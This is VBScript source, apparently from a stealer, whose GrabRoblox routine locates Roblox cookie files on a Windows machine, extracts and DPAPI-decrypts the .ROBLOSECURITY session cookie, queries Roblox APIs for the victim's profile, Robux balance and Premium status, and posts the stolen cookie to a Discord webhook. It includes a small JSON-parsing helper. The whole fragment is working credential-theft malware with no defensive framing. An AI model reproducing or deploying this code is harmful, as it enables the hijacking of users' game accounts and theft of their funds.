' --- GrabRoblox Function ---
Sub GrabRoblox()
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    Dim i, fp, raw
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
    Next
    If Len(fp) = 0 Then
        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
        If fso.FolderExists(pk) Then
            Dim folder, subf
            Set folder = fso.GetFolder(pk)
            For Each subf In folder.SubFolders
                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                    If fso.FileExists(uwp) Then fp = uwp: Exit For
                End If
            Next
            Set folder = Nothing
        End If
    End If
    If Len(fp) = 0 Then Exit Sub
    raw = ReadFile(fp)
    If Len(raw) < 50 Then Exit Sub

    Dim cookie: cookie = ""
    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
        Dim sp: sp = InStr(raw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep: ep = InStr(sp, raw, """")
            If ep > sp Then
                Dim b64: b64 = Mid(raw, sp, ep - sp)
                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
            End If
        End If
    End If
    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
        Dim rp: rp = InStr(raw, ".ROBLOSECURITY"): cookie = Mid(raw, rp)
    End If
    If Len(cookie) = 0 Then cookie = raw

    cookie = Replace(Replace(Replace(Trim(cookie), vbCr, ""), vbLf, ""), vbTab, "")
    Dim sc: sc = InStr(cookie, ";")
    If sc > 0 Then cookie = Left(cookie, sc - 1)
    cookie = Trim(cookie)
    Dim warn: warn = InStr(cookie, "_|WARNING")
    If warn > 1 Then cookie = Mid(cookie, warn)

    ' --- Fetch Profile Info via Roblox API ---
    Dim profName, profDisplay, profId, profRobux, profPremium, profCreated
    profName = "Unknown" : profDisplay = "Unknown" : profId = "0"
    profRobux = "0" : profPremium = "False" : profCreated = "Unknown"

    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    
    ' 1. Get Authenticated User
    xh.Open "GET", "https://users.roblox.com/v1/users/authenticated", False
    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
    xh.Send
    If xh.Status = 200 Then
        Dim authJson: authJson = xh.responseText
        profName = SafeField(authJson, "name")
        profDisplay = SafeField(authJson, "displayName")
        profId = SafeField(authJson, "id")
    End If
    
    ' 2. Get Robux Balance & Premium Status
    If profId <> "0" Then
        xh.Open "GET", "https://economy.roblox.com/v1/users/" & profId & "/currency", False
        xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
        xh.Send
        If xh.Status = 200 Then
            profRobux = SafeField(xh.responseText, "robux")
        End If
        
        xh.Open "GET", "https://premiumfeatures.roblox.com/v1/users/" & profId & "/validate-membership", False
        xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
        xh.Send
        If xh.Status = 200 Then
            profPremium = xh.responseText
        End If
    End If
    Set xh = Nothing

    ' --- Build Discord Embed ---
    Dim DQ: DQ = Chr(34)
    Dim j: j
    j = "{" & DQ & "embeds" & DQ & ":[{" & _
        DQ & "title" & DQ & ":" & DQ & Chr(128) & Chr(162) & " " & Ej(profName) & DQ & "," & _
        DQ & "color" & DQ & ":65280," & _
        DQ & "fields" & DQ & ":[" & _
            "{" & DQ & "name" & DQ & ":" & DQ & "User Info" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Display: **" & Ej(profDisplay) & "**\nID: `" & profId & "`" & DQ & "," & DQ & "inline" & DQ & ":false}," & _
            "{" & DQ & "name" & DQ & ":" & DQ & "Robux" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Balance: **" & profRobux & "**" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
            "{" & DQ & "name" & DQ & ":" & DQ & "Premium" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Status: **" & profPremium & "**" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
            "{" & DQ & "name" & DQ & ":" & DQ & ".ROBLOSECURITY" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "```" & Ej(cookie) & "```" & DQ & "," & DQ & "inline" & DQ & ":false}" & _
        "]}]}"

    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

' --- Helper to parse JSON without external libraries ---
Function SafeField(json, key)
    SafeField = ""
    Dim pat: pat = Chr(34) & key & Chr(34) & ":"
    Dim pos: pos = InStr(json, pat)
    If pos = 0 Then Exit Function
    Dim vs: vs = pos + Len(pat)
    
    ' Handle strings
    If Mid(json, vs, 1) = Chr(34) Then
        vs = vs + 1
        Dim ve: ve = InStr(vs, json, Chr(34))
        If ve > vs Then SafeField = Mid(json, vs, ve - vs)
    ' Handle integers/booleans
    Else
        Dim ve: ve = InStr(vs, json, ",")
        If ve = 0 Then ve = InStr(vs, json, "}")
        If ve > vs Then SafeField = Mid(json, vs, ve - vs)
    End If
End Function
